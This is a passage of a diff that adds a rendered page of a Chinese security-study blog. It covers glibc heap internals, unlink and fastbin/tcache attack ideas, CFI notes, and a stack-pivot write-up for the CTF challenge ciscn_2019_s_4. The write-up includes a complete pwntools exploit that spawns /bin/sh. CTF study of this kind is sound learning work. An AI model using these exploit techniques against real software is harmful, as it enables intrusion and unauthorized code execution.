+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>                              \
+            <span class="token comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span>
+            <span class="token comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span>
+            <span class="token comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span>
+            <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      \
+            <span class="token comment">// 类似于小的 chunk 的检查思路</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>              \
+                <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \
+              <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>                                      \
+                               <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \
+                               P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>                                              \
+            <span class="token comment">// 这里说明 P 已经在 nextsize 链表中了。</span>
+            <span class="token comment">// 如果 FD 没有在 nextsize 链表中</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                      \
+                <span class="token comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span>
+                <span class="token comment">// 令 FD 为 nextsize 串起来的</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>                                      \
+                  FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                      \
+                <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                              \
+                <span class="token comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span>
+                    FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>                              \
+                    FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>                              \
+                    P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                              \
+                    P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                              \
+                  <span class="token punctuation">}</span>                                                              \
+              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                              \
+                <span class="token comment">// 如果在的话，直接拿走即可</span>
+                P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>                      \
+                P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>                      \
+              <span class="token punctuation">}</span>                                                                      \
+          <span class="token punctuation">}</span>                                                                      \
+      <span class="token punctuation">}</span>                                                                              \
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>注意：以上操作有个Bug、就是其只是对P前后的内容进行了处理，也就是只对链进行了处理，但是并没有对P本身这个块进行任何的处理。也就是P-&gt;fd,和P-&gt;bk两个指针中还是存储着地址值的。因此可以利用这个地址进行libc地址的泄露</li>
+<li>泄露思路：<ul>
+<li>P 位于双向链表头部，bk 泄漏</li>
+<li>P 位于双向链表尾部，fd 泄漏</li>
+<li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏（啥意思？双向链表的起始地址，及时libc的地址吗？？）</li>
+</ul>
+</li>
+<li>泄露堆地址<ul>
+<li>P 位于双向链表头部，fd 泄漏</li>
+<li>P 位于双向链表中，fd 和 bk 均可以泄漏</li>
+<li>P 位于双向链表尾部，bk 泄漏</li>
+</ul>
+</li>
+<li>注意：<ul>
+<li>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</li>
+<li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li>
+<li><strong>堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="init-malloc函数"><a href="#init-malloc函数" class="headerlink" title="_init_malloc函数"></a>_init_malloc函数</h3><p>该函数是malloc申请内存的底层函数</p>
+<ol>
+<li>它根据用户申请的<strong>内存块大小</strong>以及<strong>相应大小 chunk 通常使用的频度</strong>（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li>
+<li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li>
+<li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li>
+<li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li>
+</ol>
+<ul>
+<li>注意一点，所有的数据进入malloc之后全部都会被转化为无符号整数。</li>
+<li>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。<strong>为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</strong></li>
+</ul>
+<h2 id="堆溢出常见攻击手段"><a href="#堆溢出常见攻击手段" class="headerlink" title="堆溢出常见攻击手段"></a>堆溢出常见攻击手段</h2><p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016077.png" alt="image-20230625155220102"></p>
+<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>​	堆溢出的本质可以类比栈溢出的内容，堆溢出的本质是从用户缓冲区向下溢出到下一个堆块中，如果溢出长度够长，甚至能够重写下一个堆块中的内容。</p>
+<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>​	double free漏洞的本质是将当前对应块的指针做二次的free操作。对同一个块进行两次free操作，则该块会被加入到bin链两次，那么在后续进行多次malloc时会出现指针相同的情况</p>
+<h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><ul>
+<li>unlink的作用是将free时，操作双向链表中相邻的两个free chunk进行合并操作。</li>
+<li>注意事项:unlink不发生在<em>fastbin和smallbin</em>中,所以fastbin和smallbin容易产生漏洞。fastbin使用单向链表进行存储</li>
+<li>unlink本身存在一些检查</li>
+</ul>
+<p>unlink首先检查当前内存空间中该块的相邻块是否空闲，并且检查当前的块大小和下一个块记录的prev_size大小是否相同，如果空闲则进行合并操作。</p>
+<p>unlink的代码中实现的操作就是将当前程序中的某个chunk从双向链表中取出来，下面的代码以当前要取出的块是p为例。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">FD <span class="token operator">=</span> p<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
+BK <span class="token operator">=</span> p<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
+FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>
+BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>
+<span class="token comment">// 其实就是传统的双向链表取元素的操作</span>
+<span class="token comment">/*
+	上述操作中，当前块的fd和bk是可以被伪造的。
+	假设此刻将两个地址分别重写为got[free], 和shellcode地址
+	执行前两条指令后。
+	FD = got[free] - 12（32位机器）
+	BK = shellcode  // 这里BK要加fd，所以不需要存储
+	执行第三条指令，将got表中的地址写为shellcode地址，从而实现got表劫持
+	但是这个方法在新版libc里没有用！！！
+*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​	unlink之前需要进行一些简单的检查，这个检查是可以欺骗的：</p>
+<p>​	fd的偏移是3个机器位数，bk的偏移是4个机器位数。即在64位机器上，fd是8*3=24字节，bk是8*4=32字节；32位机器上，fd是4 *3 =12字节，bk是4*4=16字节。设伪空闲堆块的堆块头指针是p，那么需要检查：p-&gt;bk-&gt;fd==p &amp;&amp; p-&gt;fd-&gt;bk==p, 只需要保证满足 fd = &amp;p - 3*size(int); bk = &amp;p - 2*size(int) 即可。</p>
+<p>​	<strong>也就是说</strong>：在新版的glibc中，使用另一种思路，依赖于一个UAF漏洞，对一个已经free的堆块进行修改。假设想要修改的内存是ptr，那么就修改这p中fd = &amp;ptr - 3*size(int); bk = &amp;ptr- 2*size(int) ，在检查的过程中BK-&gt;fd = FD-&gt;BK = ptr。 最终在执行完unlink操作后，ptr变为了ptr-0x18（其实也就是最后一条指令的作用），但是同样新版的unlink也会修改</p>
+<h4 id="例题-0CTF2015-freenote"><a href="#例题-0CTF2015-freenote" class="headerlink" title="例题 0CTF2015 freenote"></a>例题 0CTF2015 freenote</h4><p>​	</p>
+<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>fastbin是一种简单的单向链表，用于存储大小小于等于0x80（默认情况下）的已经释放的堆块。Fastbin attack的基本原理是利用fastbin链表的机制，通过伪造堆块的头部，使得堆分配器将伪造的堆块地址返回给程序，从而控制被释放的堆块的指针。攻击者可以通过覆盖被释放的堆块的指针，实现任意地址写或者控制流劫持。</p>
+<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODUzNTc=">https://www.anquanke.com/post/id/85357</span></p>
+<ul>
+<li>house of sporit与double free存在相似之处，二者的区别free掉的块一个指向真正被malloc的过的内存，而另一个则是构造一个完全虚假的内存块，并且包含精心构造的chunk数据结构</li>
+<li></li>
+</ul>
+<h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h3><p>tcache本身是单向链表，并且一个线程对应一个tcache存在。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9maXJtaWFuYXkuZ2l0Ym9va3MuaW8vY3RmLWFsbC1pbi1vbmUvY29udGVudC9kb2MvNC4xNF9nbGliY190Y2FjaGUuaHRtbCNjdGYtJUU1JUFFJTlFJUU0JUJFJThC">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html#ctf-%E5%AE%9E%E4%BE%8B</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly92MWNreWR4cC5naXRodWIuaW8vMjAxOS8wNi8zMC9UY2FjaGUtJUU2JTlDJUJBJUU1JTg4JUI2JUU1JTg4JTg2JUU2JTlFJTkwJUU1JThGJThBJUU1JTg4JUE5JUU3JTk0JUE4JUU2JTgwJTlEJUU4JUI3JUFGLw==">https://v1ckydxp.github.io/2019/06/30/Tcache-%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</span></p>
+<h2 id="堆利用例题"><a href="#堆利用例题" class="headerlink" title="堆利用例题"></a>堆利用例题</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s">https://www.freebuf.com/articles/system/171261.html</span></p>
+<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3>
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/05/05/bypass-aslr/">bypass-aslr</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-05-05</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/05/02/cfi-sec/">CFI-Sec</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-05-02</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    <h2 id="Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms"><a href="#Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms" class="headerlink" title="Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms"></a>Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms</h2><hr>
+<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048279.png" alt="image-20230502185448539"></p>
+<p>​	最早的CFI机制在2005年被提出，后续又出现了各种各样的CFI，但是有一点就是这些机制都不能给予程序绝对的控制流安全性。通常的做法是给ICT（indirect control transfer）指令施加监视器，一个ICT可能存在多个合法的跳转目标，但是在每次执行的时候只能跳转到一个确定的位置。（因此最理想的情况就是每条跳转指令只能有一个确定的跳转位置）</p>
+<p>​	当前的任何CFI控制流安全策略都需要解决以下几个问题：</p>
+<ul>
+<li>如何让claimed boundary和real boundary match？</li>
+<li>有些可行的目标组合依然会导致漏洞利用（这不就是DOP么？）</li>
+</ul>
+<p>然后这个文章后面讲了评估CFI方案好坏的方法，等用到的时候再看</p>
+
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/05/02/bypass-nx/">bypass-NX</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-05-02</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    <h2 id="Bypass-NX（DEP）"><a href="#Bypass-NX（DEP）" class="headerlink" title="Bypass NX（DEP）"></a>Bypass NX（DEP）</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​	栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>​	既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>
+<p><strong>least privilege &amp; seteuid(getuid())</strong></p>
+<p>​	在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">system</span><span class="token punctuation">(</span>“sh”<span class="token punctuation">)</span>
+<span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>
+<ul>
+<li>ESP lifting (ESP抬升)</li>
+<li>Frame Faking(栈帧伪造)</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></li>
+</ul>
+<p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leave:
+        move esp,ebp ; 恢复栈顶指针
+        pop ebp ;(esp=esp+4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp,ebp --&gt; old_ebp
+        --&gt; ret_addr
+        --&gt; arg1 :此处是指向system字符串参数的指针
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="例题-ciscn-2019-s-4"><a href="#例题-ciscn-2019-s-4" class="headerlink" title="例题 ciscn_2019_s_4"></a>例题 ciscn_2019_s_4</h3><p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png" alt="image-20230504193243253"></p>
+<p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>
+<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png" alt="image-20230504193612815"></p>
+<p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置
+...
+ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
+	   [ret_add] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
+	mov esp,ebp
+----------------------------------------------
+ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此
+	   [new_ret_addr] ; 记录当前的返回地址
+----------------------------------------------
+inst: 
+	pop ebp
+----------------------------------------------
+ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论
+esp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: 
+	mov esp,ebp
+----------------------------------------------
+ebp,esp = buff_ ; 执行结束后完成将esp的抬升
+----------------------------------------------
+inst: 
+	pop ebp
+----------------------------------------------
+esp = buff_ ;  
+ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+	静态查找leave ret指令地址
+'''</span>
+system_addr <span class="token operator">=</span> <span class="token number">0x8048400</span>
+leave_ret_addr<span class="token operator">=</span><span class="token number">0x080484B8</span>
+ret_addr <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+	第一次直接构造和buff长度相同的输入，printf时会输出后续内容
+'''</span>
+payload <span class="token operator">=</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?\n'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+	接收泄露的ebp输出
+'''</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">)</span>
+ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+	这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38
+'''</span>
+fake_ebp <span class="token operator">=</span> ebp <span class="token operator">-</span><span class="token number">0x38</span>
+<span class="token triple-quoted-string string">'''
+	构造第二次输入的payload
+'''</span>
+payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment"># ret addr</span>
+payload<span class="token operator">+=</span><span class="token string">b'aaaa'</span> <span class="token comment"># junk ret addr 用于模拟call system时的压入返回值操作</span>
+payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>
+payload<span class="token operator">+=</span><span class="token string">b'/bin/sh\x00'</span> <span class="token comment"># payload</span>
+payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token comment"># 这里对当前的栈进行补齐操作</span>
+payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>
+payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>leave_ret_addr<span class="token punctuation">)</span> <span class="token comment"># 填入leave ret返回值</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意两个关键位置：</p>
+<p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>
+<p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=">https://blog.csdn.net/sea_time/article/details/106142971</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></p>
+
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/05/02/personal-plan/">personal_plan</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-05-02</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    <h1 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h1><p>​	本文用于对当前的栈中的内容和未学习内容进行索引。<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NIWWJldGEvU29mdHdhcmUtU2VjdXJpdHktTGVhcm5pbmc=">https://github.com/CHYbeta/Software-Security-Learning</span></p>
+<h2 id="二进制安全"><a href="#二进制安全" class="headerlink" title="二进制安全"></a>二进制安全</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li><strong>SEH机制</strong></li>
+<li></li>
+</ul>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li>One byte overflow</li>
+</ul>
+<h2 id="安卓安全"><a href="#安卓安全" class="headerlink" title="安卓安全"></a>安卓安全</h2><h2 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h2><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><ul>
+<li></li>
+</ul>
+<h2 id="CTF-WP"><a href="#CTF-WP" class="headerlink" title="CTF WP"></a>CTF WP</h2>
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/04/27/one-byte-overflow/">one_byte_overflow</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-04-27</span>
+                
+            </div>
+            <div class="post-content">
+                
